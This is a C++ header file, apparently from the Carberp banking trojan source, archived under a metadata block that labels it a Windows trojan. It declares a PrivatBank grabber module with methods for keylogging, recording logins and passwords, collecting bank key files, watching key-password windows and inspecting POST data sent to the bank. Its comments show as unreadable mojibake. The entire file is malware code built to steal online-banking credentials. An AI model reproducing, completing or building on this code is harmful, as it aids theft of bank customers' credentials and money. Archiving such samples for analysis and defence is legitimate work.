/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
//  ������ ������ ����� �����������
//---------------------------------------------------------------------------

#ifndef PrivatBankH
#define PrivatBankH
//---------------------------------------------------------------------------

#include <windows.h>


#include "GetApi.h"
#include "Strings.h"
#include "KeyLogger.h"
#include "Grabbers.h"


namespace PrivatBank
{
	//------------------------------------------------
	//  Initialize - ������� �������������� ������
	//				 ������ ����� �����������
	//------------------------------------------------
	bool Initialize(HWND Wnd, DWORD  WndClassHash);

	//------------------------------------------------
	//  CheckPostData - ������� ��������� ���� ������
	//                  �� ������� ����������� ������
	//                  � ������
	//------------------------------------------------
	void CheckPostData(const char* URL, const char* PostData);
}


//*****************************************************
// ������ �����������
//*****************************************************
class TPrivatBank : public TGrabber
{
private:
	TGrabberFile* FLog;
	HWND   FKeyPassWnd;
	string FKeyPassFieldName;
	bool InitializeMainLog();
	void ParseKeyFileName(const string& Text);
protected:
	void LogKeyboad(HWND aWnd, const char* Text);   // ���������� �����
	void DoEvent(int EventId, LPVOID Param);        // ���������� �����
public:
	TPrivatBank();
	~TPrivatBank();

	void AddLoginAndPassword(const string& Login, const string& Password);
	void AddKeyFile(const string& FileName);
	void ActivateKeyPassLogger(HWND Wnd, const string& WndText, int WndType);

	int static IsKeyPassWnd(const string& WndText);
};



//---------------------------------------------------------------------------
#endif
